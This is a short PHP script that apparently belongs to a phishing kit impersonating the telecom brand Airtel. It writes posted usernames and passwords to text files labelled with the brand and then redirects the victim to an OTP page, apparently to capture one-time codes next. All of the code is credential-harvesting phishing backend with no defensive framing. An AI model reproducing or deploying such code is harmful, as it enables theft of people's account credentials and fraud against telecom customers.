<?php

file_put_contents("usernames.txt", "Airtel Username: " .$_POST['username']  . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Airtel Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
